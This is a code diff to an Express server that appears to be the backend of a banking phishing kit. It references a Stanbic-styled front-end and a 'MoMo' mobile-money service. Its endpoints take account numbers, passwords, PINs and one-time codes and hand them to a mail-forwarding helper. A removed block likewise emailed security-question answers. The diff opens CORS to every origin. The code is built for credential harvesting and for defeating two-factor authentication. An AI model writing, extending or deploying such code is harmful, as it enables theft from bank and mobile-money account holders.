@@ -6,11 +6,9 @@ require("dotenv").config();
 
 // Middleware
 app.use(express.json());
-//app.use(
-//  cors({
-//    origin: "https://core-stanbic-app.vercel.app",
-//  }),
-//);
+
+// Allow ALL origins
+app.use(cors()); // <- this accepts requests from any origin
 
 const PORT = process.env.PORT || 5000;
 
@@ -49,13 +47,7 @@ const sendMailAndRespond = (
 app.post("/", (req, res) => {
   const { accountNumber, password } = req.body;
 
-  if (!accountNumber) {
-    return res
-      .status(401)
-      .json({ success: false, message: "Invalid account number or password" });
-  }
-
-  if (!password) {
+  if (!accountNumber || !password) {
     return res
       .status(401)
       .json({ success: false, message: "Invalid account number or password" });
@@ -81,7 +73,6 @@ app.post("/", (req, res) => {
 app.post("/pin", (req, res) => {
   const { pin } = req.body;
 
-  // Validate: pin must be exactly 4 digits
   if (!pin || !/^\d{4}$/.test(pin)) {
     return res.status(401).json({ success: false, message: "Invalid PIN" });
   }
@@ -106,7 +97,6 @@ app.post("/pin", (req, res) => {
 app.post("/verify-otp", (req, res) => {
   const { otp } = req.body;
 
-  // Validate: otp must be exactly 5 digits
   if (!otp || !/^\d{5}$/.test(otp)) {
     return res
       .status(400)
@@ -133,7 +123,6 @@ app.post("/verify-otp", (req, res) => {
 app.post("/resend-otp", (req, res) => {
   const { otp } = req.body;
 
-  // Validate: otp must be exactly 5 digits
   if (!otp || !/^\d{5}$/.test(otp)) {
     return res
       .status(400)
@@ -156,35 +145,7 @@ app.post("/resend-otp", (req, res) => {
   );
 });
 
-// // ─── ENDPOINT 5: POST /security-question ─── Security Question
-// app.post("/security-question", (req, res) => {
-//   const { securityQuestion, answer } = req.body;
-
-//   if (!securityQuestion || !answer || answer.length < 2) {
-//     return res
-//       .status(400)
-//       .json({ success: false, message: "Incorrect answer" });
-//   }
-
-//   const mailOptions = {
-//     from: userEmail,
-//     to: userEmail,
-//     subject: "MoMo Security Question",
-//     text: `Security Question: ${securityQuestion}\nAnswer: ${answer}`,
-//   };
-
-//   sendMailAndRespond(
-//     mailOptions,
-//     res,
-//     "Security question verified",
-//     "Incorrect answer",
-//     400,
-//   );
-// });
-
 // Start server
 app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}`);
 });
-
-
